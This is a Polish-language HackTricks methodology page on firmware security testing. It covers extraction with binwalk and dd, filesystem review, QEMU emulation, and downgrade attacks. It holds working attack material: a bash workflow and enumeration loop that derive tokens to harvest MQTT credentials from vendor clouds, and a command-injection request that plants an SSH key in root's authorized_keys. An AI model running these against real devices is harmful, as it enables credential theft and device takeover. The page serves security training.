# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmware to kluczowe oprogramowanie, które umożliwia urządzeniom prawidłowe działanie poprzez zarządzanie i ułatwianie komunikacji między komponentami hardware a oprogramowaniem, z którego korzystają użytkownicy. Jest przechowywane w pamięci nieulotnej, co zapewnia urządzeniu dostęp do istotnych instrukcji od momentu włączenia, prowadząc do uruchomienia systemu operacyjnego. Badanie i ewentualna modyfikacja firmware to istotny krok w identyfikowaniu podatności bezpieczeństwa.

## **Zbieranie informacji**

**Zbieranie informacji** to krytyczny początkowy etap w zrozumieniu budowy urządzenia i technologii, które wykorzystuje. Proces ten obejmuje zbieranie danych o:

- architekturze CPU i systemie operacyjnym, na którym działa
- szczegółach bootloadera
- układzie hardware i datasheetach
- metrykach codebase i lokalizacjach źródeł
- zewnętrznych bibliotekach i typach licencji
- historiach update'ów i certyfikatach regulacyjnych
- diagramach architektonicznych i przepływów
- ocenach bezpieczeństwa i zidentyfikowanych podatnościach

Do tego celu narzędzia open-source intelligence (OSINT) są nieocenione, podobnie jak analiza dostępnych komponentów open-source — zarówno ręczna, jak i automatyczna. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują darmową analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware**

Pozyskiwanie firmware można przeprowadzić na różne sposoby, z różnym poziomem złożoności:

- **Bezpośrednio** od źródła (deweloperzy, producenci)
- **Budując** je z dostarczonych instrukcji
- **Pobierając** ze stron wsparcia producenta
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Dostęp do **cloud storage** bezpośrednio, przy użyciu narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytywanie **update'ów** przez techniki man-in-the-middle
- **Ekstrakcja** z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Podsłuchiwanie** żądań aktualizacji w komunikacji urządzenia
- Identyfikacja i użycie **hardcoded update endpoints**
- **Zrzucenie** z bootloadera lub przez sieć
- **Usunięcie i odczytanie** chipu pamięci, gdy wszystkie inne metody zawiodą, używając odpowiednich narzędzi hardware

## Analiza firmware

Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak go traktować. Różne narzędzia, których możesz do tego użyć:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli nie znajdziesz wiele za pomocą tych narzędzi, sprawdź **entropię** obrazu przy pomocy `binwalk -E <bin>` — jeśli entropia jest niska, raczej nie jest zaszyfrowany. Jeśli wysoka, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Ponadto możesz użyć tych narzędzi, aby wyodrębnić **pliki osadzone wewnątrz firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do analizy pliku.

### Uzyskiwanie systemu plików

Dzięki powyższym narzędziom, takim jak `binwalk -ev <bin>`, powinieneś być w stanie **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu nazwanego według typu systemu plików**, który zwykle jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie wykryje bajtu magicznego systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików i wyodrębnić skompresowany system plików** z pliku binarnego oraz **ręcznie wyodrębnić** system plików zgodnie z jego typem, korzystając z poniższych kroków.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom poniższe **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatively, the following command could also be run.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza oprogramowania układowego

Po uzyskaniu firmware ważne jest jego rozebranie w celu zrozumienia struktury i potencjalnych podatności. Ten proces obejmuje użycie różnych narzędzi do analizy i ekstrakcji wartościowych danych z obrazu firmware.

### Narzędzia do analizy wstępnej

Poniżej znajduje się zestaw poleceń przeznaczonych do wstępnej inspekcji pliku binarnego (oznaczanego jako `<bin>`). Polecenia te pomagają w identyfikacji typów plików, wyodrębnianiu ciągów znaków, analizie danych binarnych oraz zrozumieniu szczegółów partycji i systemu plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić status szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Używając `binwalk -ev <bin>`, zazwyczaj można wyodrębnić system plików, często do katalogu nazwanego według typu systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących magic bytes, konieczne jest ręczne wyodrębnienie. Polega to na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), używane są różne polecenia do ręcznego wypakowania zawartości.

### Analiza systemu plików

Po wypakowaniu systemu plików zaczyna się poszukiwanie błędów bezpieczeństwa. Zwraca się uwagę na niezabezpieczone demony sieciowe, zaszyte na stałe poświadczenia, endpointy API, funkcje serwera aktualizacji, niekompilowany kod, skrypty startowe oraz skompilowane binaria do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia to:

- **etc/shadow** i **etc/passwd** w poszukiwaniu poświadczeń użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych podatności
- Osadzone binaria do dalszej analizy
- Typowe web serwery urządzeń IoT i binaria

Kilka narzędzi pomaga w odkrywaniu wrażliwych informacji i podatności w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Kontrole bezpieczeństwa skompilowanych binariów

Zarówno kod źródłowy, jak i skompilowane binaria znalezione w systemie plików muszą być sprawdzone pod kątem podatności. Narzędzia takie jak **checksec.sh** (dla binariów Unix) i **PESecurity** (dla binariów Windows) pomagają zidentyfikować niezabezpieczone binaria, które mogą zostać wykorzystane.

## Pozyskiwanie konfiguracji chmurowej i poświadczeń MQTT przez pochodne tokeny URL

Wiele hubów IoT pobiera konfigurację dla każdego urządzenia z endpointu chmurowego, który wygląda tak:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Podczas analizy firmware możesz odkryć, że <token> jest uzyskiwany lokalnie z device ID przy użyciu zaszytego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Takie rozwiązanie umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL i pobranie konfiguracji chmurowej, co często ujawnia poświadczenia MQTT w postaci jawnego tekstu i prefiksy tematów.

Praktyczny przebieg:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących wzorzec URL cloud config i adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokena z firmware

- Załaduj binaria do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyprowadź token w Bash i zamień digest na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Pozyskaj cloud config i MQTT credentials

- Skomponuj URL i pobierz JSON za pomocą curl; sparsuj przy pomocy jq, aby wyodrębnić secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystaj plaintext MQTT i słabe topic ACLs (jeśli obecne)

- Użyj odzyskanych credentials, aby subskrybować maintenance topics i szukać sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Wyliczanie przewidywalnych identyfikatorów urządzeń (na dużą skalę, z autoryzacją)

- Wiele ekosystemów osadza bajty OUI producenta/produktu/typu, po których następuje sekwencyjny sufiks.
- Możesz iterować potencjalne identyfikatory, uzyskiwać tokeny i programowo pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Uwagi
- Zawsze uzyskaj wyraźną autoryzację przed próbą mass enumeration.
- Prefer emulation lub static analysis, aby odzyskać secrets bez modyfikowania docelowego hardware, gdy to możliwe.


Proces emulowania firmware umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od hardware lub architektury, jednak przeniesienie root filesystem lub konkretnych binarek na urządzenie o zgodnej architekturze i endianness, takie jak Raspberry Pi, albo na gotową maszynę wirtualną, może ułatwić dalsze testy.

### Emulowanie pojedynczych plików binarnych

Przy badaniu pojedynczych programów kluczowe jest określenie endianness programu i architektury CPU.

#### Przykład dla architektury MIPS

Aby emulować binarkę dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian), `qemu-mips` jest używany, a dla binarek little-endian odpowiednim wyborem będzie `qemu-mipsel`.

#### Emulacja architektury ARM

Dla binarek ARM proces jest podobny — do emulacji używa się `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware, automatyzując proces i wspomagając analizę dynamiczną.

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używa się środowiska rzeczywistego lub emulowanego urządzenia. Ważne jest utrzymanie dostępu do shell systemu operacyjnego i systemu plików. Emulacja może nie odzwierciedlać dokładnie interakcji ze sprzętem, co może wymagać okazjonalnych restartów emulacji. Analiza powinna ponownie przeglądać system plików, testować i eksploatować wystawione strony WWW oraz usługi sieciowe, a także badać luki bootloadera. Testy integralności firmware są kluczowe do wykrycia potencjalnych backdoorowych luk.

## Techniki analizy w czasie wykonania

Analiza w czasie wykonania polega na interakcji z procesem lub binarką w ich środowisku uruchomieniowym, wykorzystując narzędzia takie jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania luk za pomocą fuzzingu i innych technik.

## Exploity binarne i Proof-of-Concept

Opracowanie PoC dla zidentyfikowanych luk wymaga dogłębnego zrozumienia docelowej architektury oraz programowania w językach niskiego poziomu. Ochrony czasu wykonania binarek w systemach embedded są rzadkie, ale jeśli występują, mogą być potrzebne techniki takie jak Return Oriented Programming (ROP).

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wcześniej skonfigurowane środowiska do testów bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do wspomagania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, dostarczając wcześniej skonfigurowane środowisko z wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Ataki downgrade firmware i niebezpieczne mechanizmy aktualizacji

Nawet gdy dostawca wdroży sprawdzanie podpisu kryptograficznego dla obrazów firmware, **ochrona przed version rollback (downgrade) jest często pomijana**. Jeśli bootloader lub recovery-loader weryfikuje jedynie podpis przy użyciu wbudowanego klucza publicznego, ale nie porównuje *wersji* (lub monotonicznego licznika) obrazu instalowanego na urządzeniu, atakujący może legalnie zainstalować **starsze, podatne firmware, które wciąż posiada prawidłowy podpis**, i w ten sposób ponownie wprowadzić wcześniej załatane luki.

Typowy przebieg ataku:

1. **Uzyskaj starszy podpisany obraz**
* Pobierz go z publicznego portalu do pobierania dostawcy, CDN lub strony wsparcia.
* Wydobądź go z towarzyszących aplikacji mobilnych/desktopowych (np. wewnątrz Android APK pod `assets/firmware/`).
* Pozyskaj go z repozytoriów stron trzecich takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Wgraj lub udostępnij obraz urządzeniu** przez dowolny otwarty kanał aktualizacji:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Wiele konsumenckich urządzeń IoT udostępnia *unauthenticated* endpointy HTTP(S), które przyjmują Base64-encoded firmware blobs, dekodują je po stronie serwera i wywołują recovery/upgrade.
3. Po downgrade'u wykorzystaj lukę, która została załatana w nowszym wydaniu (na przykład filtr command-injection, który został dodany później).
4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection po downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (zdegradowanym) firmware parametr `md5` jest konkatenowany bezpośrednio do polecenia shell bez sanitacji, co pozwala na wstrzyknięcie dowolnych poleceń (tutaj – umożliwiając dostęp root za pomocą klucza SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed downgrade sprawia, że poprawka jest bezskuteczna.

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do swoich aplikacji mobilnych towarzyszących, aby aplikacja mogła zaktualizować urządzenie przez Bluetooth/Wi‑Fi. Te pakiety są zwykle przechowywane bez szyfrowania w APK/APEX pod ścieżkami takimi jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, lub nawet zwykłe `unzip` pozwalają wyodrębnić podpisane obrazy bez konieczności dotykania fizycznego sprzętu.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista kontrolna do oceny logiki aktualizacji

* Czy transport/autoryzacja *update endpoint* jest odpowiednio zabezpieczona (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik przeciw rollbackowi** przed wgrywaniem?
* Czy obraz jest weryfikowany w ramach secure boot (np. podpisy sprawdzane przez kod ROM)?
* Czy kod w userland wykonuje dodatkowe kontrole poprawności (np. dozwolony układ partycji, numer modelu)?
* Czy *częściowe* lub *zapasowe* procesy aktualizacji ponownie wykorzystują tę samą logikę walidacji?

> 💡  Jeśli któregokolwiek z powyższych brakuje, platforma prawdopodobnie jest podatna na rollback attacks.

## Podatne firmware do ćwiczeń

Aby poćwiczyć wyszukiwanie podatności w firmware, użyj następujących projektów podatnego firmware jako punktu wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Źródła

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
